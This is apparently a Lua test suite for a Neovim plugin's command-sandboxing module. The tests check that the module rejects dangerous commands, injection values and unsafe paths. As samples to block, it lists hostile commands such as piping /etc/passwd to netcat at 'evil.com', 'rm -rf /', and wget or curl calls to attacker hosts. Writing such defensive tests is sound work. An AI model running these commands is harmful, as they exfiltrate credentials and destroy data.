-- Tests for secure_exec module using Plenary
local secure_exec = require('todo-ai.secure_exec')

describe("secure_exec", function()
  describe("command validation", function()
    it("should allow safe commands", function()
      local valid, err = secure_exec.validate_command("ls")
      assert.is_true(valid, "Should allow ls")

      valid, err = secure_exec.validate_command("git")
      assert.is_true(valid, "Should allow git")

      valid, err = secure_exec.validate_command("curl")
      assert.is_true(valid, "Should allow curl")
    end)

    it("should reject dangerous commands", function()
      local valid, err = secure_exec.validate_command("rm")
      assert.is_false(valid, "Should reject rm")
      assert.has_match(err, "Dangerous command blocked")

      valid, err = secure_exec.validate_command("sudo")
      assert.is_false(valid, "Should reject sudo")

      valid, err = secure_exec.validate_command("eval")
      assert.is_false(valid, "Should reject eval")
    end)

    it("should detect dangerous patterns", function()
      local valid, err = secure_exec.validate_command("ls && rm -rf /")
      assert.is_false(valid, "Should detect command chaining")

      valid, err = secure_exec.validate_command("cat /etc/passwd | nc evil.com")
      assert.is_false(valid, "Should detect pipe to network")

      valid, err = secure_exec.validate_command("echo $(whoami)")
      assert.is_false(valid, "Should detect command substitution")
    end)
  end)

  describe("argument sanitization", function()
    it("should sanitize safe arguments", function()
      local args = {"-la", "../test", "file.txt"}
      local sanitized = secure_exec.sanitize_args(args)
      assert.are.same(args, sanitized, "Should keep safe args")
    end)

    it("should remove command injection attempts", function()
      local args = {"; rm -rf /", "file.txt"}
      local sanitized = secure_exec.sanitize_args(args)
      assert.is_false(vim.tbl_contains(sanitized, "; rm -rf /"), "Should remove injection")
      assert.is_true(vim.tbl_contains(sanitized, "file.txt"), "Should keep safe arg")
    end)

    it("should handle special characters", function()
      local args = {"file with spaces.txt", "$(whoami)", "`date`"}
      local sanitized = secure_exec.sanitize_args(args)

      -- Should keep file with spaces
      assert.is_true(vim.tbl_contains(sanitized, "file with spaces.txt"))

      -- Should remove command substitutions
      local has_substitution = false
      for _, arg in ipairs(sanitized) do
        if arg:match('%$%(') or arg:match('`') then
          has_substitution = true
        end
      end
      assert.is_false(has_substitution, "Should remove command substitutions")
    end)
  end)

  describe("URL validation", function()
    it("should accept valid URLs", function()
      local valid_urls = {
        "https://api.example.com",
        "http://localhost:3000",
        "https://api.example.com/v1/endpoint"
      }

      for _, url in ipairs(valid_urls) do
        assert.is_true(secure_exec.validate_url(url), "Should accept: " .. url)
      end
    end)

    it("should reject dangerous URLs", function()
      local invalid_urls = {
        "file:///etc/passwd",
        "javascript:alert(1)",
        "../../../etc/passwd",
        "'; DROP TABLE users; --"
      }

      for _, url in ipairs(invalid_urls) do
        assert.is_false(secure_exec.validate_url(url), "Should reject: " .. url)
      end
    end)
  end)

  describe("file path validation", function()
    it("should accept safe relative paths", function()
      local safe_paths = {
        "file.txt",
        "./src/module.lua",
        "docs/README.md"
      }

      for _, path in ipairs(safe_paths) do
        assert.is_true(secure_exec.validate_file_path(path), "Should accept: " .. path)
      end
    end)

    it("should reject dangerous paths", function()
      local unsafe_paths = {
        "/etc/passwd",
        "../../../etc/passwd",
        "~/.ssh/id_rsa",
        "/root/.bashrc"
      }

      for _, path in ipairs(unsafe_paths) do
        assert.is_false(secure_exec.validate_file_path(path), "Should reject: " .. path)
      end
    end)
  end)

  describe("async command execution", function()
    it("should execute safe commands", function(done)
      secure_exec.execute_safe("echo", {"hello"}, function(success, output, error)
        assert.is_true(success, "Should succeed")
        assert.has_match(output, "hello", "Should return output")
        assert.is_nil(error, "Should have no error")
        done()
      end)
    end)

    it("should handle command failure", function(done)
      secure_exec.execute_safe("ls", {"/nonexistent"}, function(success, output, error)
        assert.is_false(success, "Should fail")
        assert.is_not_nil(error, "Should have error")
        done()
      end)
    end)

    it("should reject disallowed commands", function(done)
      secure_exec.execute_safe("rm", {"-rf", "/tmp/test"}, function(success, output, error)
        assert.is_false(success, "Should reject dangerous command")
        assert.has_match(error, "not allowed", "Should report not allowed")
        done()
      end)
    end)
  end)

  describe("timeout handling", function()
    it("should respect command timeouts", function(done)
      -- This test uses async callback
      secure_exec.execute_with_timeout("sleep", {"10"}, 100, function(success, output, error)
        assert.is_false(success, "Should fail on timeout")
        assert.is_not_nil(error, "Should have error")
        assert.has_match(error:lower(), "timeout", "Should mention timeout")
        done()
      end)
    end)
  end)

  describe("curl operations", function()
    it("should build safe curl commands", function()
      -- Mock curl to test command building
      local original_system = vim.fn.systemlist
      local captured_cmd = nil

      vim.fn.systemlist = function(cmd)
        captured_cmd = cmd
        return {"{}"}  -- Mock response
      end

      local result, err = secure_exec.curl("https://api.example.com", {
        method = "POST",
        headers = {"Content-Type: application/json"},
        data = '{"key": "value"}'
      })

      -- Restore
      vim.fn.systemlist = original_system

      assert.is_not_nil(captured_cmd, "Should execute command")
      assert.equals("curl", captured_cmd[1], "Should start with curl")
      assert.is_true(vim.tbl_contains(captured_cmd, "-X"), "Should include method flag")
      assert.is_true(vim.tbl_contains(captured_cmd, "POST"), "Should include POST")
    end)

    it("should validate URLs before curl", function()
      local result, err = secure_exec.curl("javascript:alert(1)", {})
      assert.is_nil(result, "Should reject invalid URL")
      assert.is_not_nil(err, "Should return error")
    end)

    it("should handle async curl", function(done)
      -- Mock job for testing
      local original_jobstart = vim.fn.jobstart
      vim.fn.jobstart = function(cmd, opts)
        -- Simulate successful response
        vim.defer_fn(function()
          if opts.on_stdout then
            opts.on_stdout(1, {"response data"}, "stdout")
          end
          if opts.on_exit then
            opts.on_exit(1, 0, "exit")
          end
        end, 10)
        return 1
      end

      secure_exec.curl_async("https://api.example.com", {}, function(result, error)
        assert.is_not_nil(result, "Should get result")
        assert.is_nil(error, "Should have no error")
        assert.has_match(result, "response data")
        vim.fn.jobstart = original_jobstart
        done()
      end)
    end)
  end)

  describe("git operations", function()
    it("should allow safe git subcommands", function()
      -- Mock systemlist
      local original = vim.fn.systemlist
      vim.fn.systemlist = function(cmd)
        return {"mock output"}
      end

      local result, err = secure_exec.git({"status"})
      assert.is_not_nil(result)

      result, err = secure_exec.git({"log", "--oneline"})
      assert.is_not_nil(result)

      vim.fn.systemlist = original
    end)

    it("should reject dangerous git subcommands", function()
      local result, err = secure_exec.git({"push", "--force"})
      assert.is_nil(result, "Should reject non-whitelisted subcommand")
      assert.has_match(err, "not allowed")
    end)
  end)

  describe("resource limits", function()
    it("should enforce data size limits", function()
      local large_data = string.rep("x", 11 * 1024 * 1024)  -- 11MB
      assert.has_error(function()
        secure_exec.validate_data_size(large_data)
      end, "Should reject excessive data")
    end)

    it("should limit command length", function()
      local long_cmd = string.rep("a", 10001)
      local valid, err = secure_exec.validate_command(long_cmd)
      assert.is_false(valid)
      assert.has_match(err, "too long")
    end)
  end)

  describe("command chaining prevention", function()
    it("should detect various chaining attempts", function()
      local dangerous = {
        "ls; rm -rf /",
        "cat file && curl evil.com",
        "echo test || wget malware.com",
        "grep pattern | nc attacker.com 1234"
      }

      for _, cmd in ipairs(dangerous) do
        local valid, err = secure_exec.validate_command(cmd)
        assert.is_false(valid, "Should reject: " .. cmd)
      end
    end)
  end)
end)